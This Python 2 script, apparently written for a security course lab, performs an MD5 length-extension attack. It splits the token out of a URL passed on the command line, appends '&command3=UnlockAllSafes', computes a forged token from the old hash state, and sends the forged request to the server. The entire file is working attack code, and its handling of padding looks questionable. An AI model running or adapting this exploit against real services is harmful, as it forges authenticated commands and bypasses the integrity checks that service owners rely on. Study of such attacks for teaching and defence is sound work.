from  pymd5 import md5, padding
import httplib, urlparse, urllib, sys

url = urllib.quote(sys.argv[1])



idx1 = url.find("token%3D")
idx2 = url.find("%26user%3D")


url1 = url[:idx1+8]
token = url[idx1+8:idx2]
url2 = url[idx2:len(url)]

x = "&command3=UnlockAllSafes"
url2 = url2 + x

l_of_m = 8 + len(url2)
bits = (l_of_m + len(padding(l_of_m*8)))*8


h = md5(state=(token).decode("hex"), count=bits)

x += urllib.quote(padding((l_of_m + len(x)) * 8))




h.update(x)

new_token = h.hexdigest()


new_url = url1 + new_token + url2
#print urllib.unquote(url)
#print urllib.unquote(new_url)

parsedUrl = urlparse.urlparse(urllib.unquote(new_url))
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
